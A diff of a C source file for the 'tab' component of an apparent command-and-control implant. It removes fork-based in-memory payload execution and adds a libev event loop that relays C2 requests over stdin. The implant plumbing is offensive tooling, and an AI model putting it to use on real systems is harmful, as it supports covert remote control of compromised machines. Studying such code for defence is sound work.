@@ -29,309 +29,136 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <ev.h>
 
 #include <sys/types.h>
 #include <sys/wait.h>
 
-#include <tab.h>
-#include <c2.h>
-#include <log.h>
-#include <tlv.h>
-#include <tlv_types.h>
 #include <api.h>
+#include <tab.h>
+#include <log.h>
+#include <link.h>
+#include <queue.h>
 #include <pawn.h>
 
-#include <uthash/uthash.h>
+static void tab_signal_handler(struct ev_loop *loop, ev_signal *w, int revents)
+{
+    switch (w->signum)
+    {
+		case SIGINT:
+		    log_debug("* TAB has SIGINT caught\n");
+		    ev_break(loop, EVBREAK_ALL);
+		    break;
 
-static int create_tab_disk(tabs_t *tab, char *filename)
+		case SIGTERM:
+		    log_debug("* TAB has SIGTERM caught\n");
+			ev_break(loop, EVBREAK_ALL);
+			break;
+
+		default:
+			break;
+	}
+}
+
+void tab_read(void *data)
 {
     c2_t *c2;
-    pid_t pid;
-
-    int pipes[2];
-    char *argv[1];
-
-    c2 = c2_create(tab->id, NULL_FD, NULL);
-
-    if (c2 == NULL)
-    {
-        return -1;
-    }
-
-    pid = fork();
-
-    if (pid == -1)
-    {
-        c2_destroy(c2);
-        return -1;
-    }
-
-    else if (pid == 0)
-    {
-        dup2(pipes[0], STDIN_FILENO);
-        argv[0] = "pwny";
-
-        execv(filename, argv);
-        exit(EXIT_SUCCESS);
-    }
-    else
-    {
-        fcntl(pipes[1], F_SETFL, O_NONBLOCK);
-
-        c2->fd = pipes[1];
-        tab->c2 = c2;
-        tab->pid = pid;
-    }
-
-    return 0;
-}
-
-static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
-{
-    c2_t *c2;
-    pid_t pid;
-
-    int pipes[2];
-    char *argv[1];
-    unsigned char *frame;
-
-    if (pipe(pipes) == -1)
-    {
-        return -1;
-    }
-
-    frame = malloc(size);
-
-    if (frame == NULL)
-    {
-        return -1;
-    }
-
-    memcpy(frame, buffer, size);
-    pid = fork();
-
-    c2 = c2_create(tab->id, NULL_FD, NULL);
-
-    if (c2 == NULL)
-    {
-        return -1;
-    }
-
-    if (pid == -1)
-    {
-        free(frame);
-        c2_destroy(c2);
-        return -1;
-    }
-    else if (pid == 0)
-    {
-        dup2(pipes[0], STDIN_FILENO);
-        argv[0] = "pwny";
-
-#if defined(__APPLE__)
-        pawn_exec_bundle(frame, argv, NULL);
-#elif defined(__linux__) || defined(__unix__)
-        pawn_exec_fd(frame, argv, NULL);
-#elif defined(_WIN32)
-        pawn_exec(frame, argv);
-#endif
-
-        free(frame);
-        exit(EXIT_SUCCESS);
-    }
-    else
-    {
-        fcntl(pipes[1], F_SETFL, O_NONBLOCK);
-
-        c2->fd = pipes[1];
-        tab->c2 = c2;
-        tab->pid = pid;
-    }
-
-    return 0;
-}
-
-tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
-{
-    tabs_t *tab;
-    tlv_pkt_t *tlv_pkt;
-
-    log_debug("* Searching for tab entry (%d)\n", id);
-
-    HASH_FIND_INT(*tabs, &id, tab);
-
-    if (tab != NULL)
-    {
-        log_debug("* Found tab entry (%d)\n", id);
-
-        if (c2_write(tab->c2, c2->tlv_pkt) < 0)
-        {
-            return NULL;
-        }
-
-        tlv_pkt = tlv_pkt_create();
-
-        if (c2_read(tab->c2, &tlv_pkt) < 0)
-        {
-            tlv_pkt_destroy(tlv_pkt);
-            return NULL;
-        }
-
-        return tlv_pkt;
-    }
-
-    log_debug("* Tab was not found (%d)\n", id);
-    return NULL;
-}
-
-int tab_add_disk(tabs_t **tabs, int id, char *filename)
-{
-    tabs_t *tab;
-    tabs_t *tab_new;
-
-    HASH_FIND_INT(*tabs, &id, tab);
-
-    if (tab == NULL)
-    {
-        tab_new = calloc(1, sizeof(*tab_new));
-
-        if (tab_new != NULL)
-        {
-            tab_new->id = id;
-
-            if (create_tab_disk(tab_new, filename) < 0)
-            {
-                free(tab_new);
-                return -1;
-            }
-
-            HASH_ADD_INT(*tabs, id, tab_new);
-            log_debug("* Added tab entry (%d)\n", id);
-
-            return 0;
-        }
-    }
-
-    return -1;
-}
-
-int tab_add_buffer(tabs_t **tabs, int id, unsigned char *buffer, int size)
-{
-    tabs_t *tab;
-    tabs_t *tab_new;
-
-    HASH_FIND_INT(*tabs, &id, tab);
-
-    if (tab == NULL)
-    {
-        tab_new = calloc(1, sizeof(*tab_new));
-
-        if (tab_new != NULL)
-        {
-            tab_new->id = id;
-
-            if (create_tab_buffer(tab_new, buffer, size) < 0)
-            {
-                free(tab_new);
-                return -1;
-            }
-
-            HASH_ADD_INT(*tabs, id, tab_new);
-            log_debug("* Added tab entry (%d)\n", id);
-
-            return 0;
-        }
-    }
-
-    return -1;
-}
-
-void tab_wait(tabs_t *tab)
-{
-    pid_t pid;
     int status;
 
-    do
+    c2 = data;
+
+    if (c2_dequeue_tlv(c2, &c2->request) > 0)
     {
-        pid = waitpid(tab->pid, &status, 0);
-        if (pid == -1)
+        switch (api_process_c2(c2))
         {
-            break;
+            case API_BREAK:
+                log_debug("* Received API_BREAK signal (%d)\n", API_BREAK);
+
+                c2_enqueue_tlv(c2, c2->response);
+
+                goto clean_out;
+
+            case API_CALLBACK:
+                log_debug("* Received API_CALLBACK signal (%d)\n", API_CALLBACK);
+
+                c2_enqueue_tlv(c2, c2->response);
+                goto clean_out;
+
+            case API_SILENT:
+                log_debug("* Received API_SILENT signal (%d)\n", API_SILENT);
+                goto clean_in;
+
+            default:
+                break;
         }
     }
-    while (!WIFEXITED(status) && !WIFSIGNALED(status));
+
+clean_out:
+    tlv_pkt_destroy(c2->response);
+
+clean_in:
+    tlv_pkt_destroy(c2->request);
 }
 
-int tab_exit(tabs_t *tab)
+void tab_write(void *data)
 {
-    tlv_pkt_t *tlv_pkt;
+    c2_t *c2;
 
-    tlv_pkt = tlv_pkt_create();
-
-    if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
-    {
-        goto fail;
-    }
-
-    if (c2_write(tab->c2, tlv_pkt) < 0)
-    {
-        goto fail;
-    }
-
-    log_debug("* Waiting for tab to shutdown (%d)\n", tab->id);
-    tab_wait(tab);
-
-    log_debug("* Tab %d on PID %d shutdown\n", tab->id, tab->pid);
-
-    return 0;
-
-fail:
-    tlv_pkt_destroy(tlv_pkt);
-    return -1;
+    c2 = data;
+    net_write(c2->net);
 }
 
-int tab_delete(tabs_t **tabs, int id)
+tab_t *tab_create(void)
 {
-    tabs_t *tab;
+    tab_t *tab;
+    int flags;
 
-    HASH_FIND_INT(*tabs, &id, tab);
+    tab = calloc(1, sizeof(*tab));
 
-    if (tab != NULL)
+    if (tab == NULL)
     {
-        if (tab_exit(tab) < 0)
-        {
-            return -1;
-        }
-
-        HASH_DEL(*tabs, tab);
-
-        c2_destroy(tab->c2);
-        free(tab);
-
-        log_debug("* Deleted tab entry (%d)\n", id);
-        return 0;
+        return NULL;
     }
 
-    return -1;
+    tab->loop = ev_default_loop(TAB_EV_FLAGS);
+
+    flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+    flags = fcntl(STDOUT_FILENO, F_GETFL, 0);
+    fcntl(STDOUT_FILENO, F_SETFL, flags | O_NONBLOCK);
+    flags = fcntl(STDERR_FILENO, F_GETFL, 0);
+    fcntl(STDERR_FILENO, F_SETFL, flags | O_NONBLOCK);
+
+    tab->c2 = NULL;
+
+    c2_add_file(&tab->c2, 0, STDIN_FILENO);
+    c2_set_links(tab->c2, tab_read, tab_write, NULL);
+    c2_setup(tab->c2, tab->loop);
+
+    return tab;
 }
 
-void tabs_free(tabs_t *tabs)
+int tab_start(tab_t *tab)
 {
-    tabs_t *tab;
+    int status;
+    ev_signal sigint_w, sigterm_w;
 
-    for (tab = tabs; tab != NULL; tab = tab->hh.next)
-    {
-        if (tab_exit(tab) < 0)
-        {
-            continue;
-        }
+    ev_signal_init(&sigint_w, tab_signal_handler, SIGINT);
+    ev_signal_start(tab->loop, &sigint_w);
+    ev_signal_init(&sigterm_w, tab_signal_handler, SIGTERM);
+    ev_signal_start(tab->loop, &sigterm_w);
 
-        log_debug("* Freed tab entry (%d)\n", tab->id);
-        HASH_DEL(tabs, tab);
+    net_start(tab->c2->net);
 
-        c2_destroy(tab->c2);
-        free(tab);
-    }
+    status = ev_run(tab->loop, 0);
+    c2_free(tab->c2);
 
-    free(tabs);
+    return status;
+}
+
+void tab_destroy(tab_t *tab)
+{
+    ev_break(tab->loop, EVBREAK_ALL);
+    c2_free(tab->c2);
+    free(tab);
 }
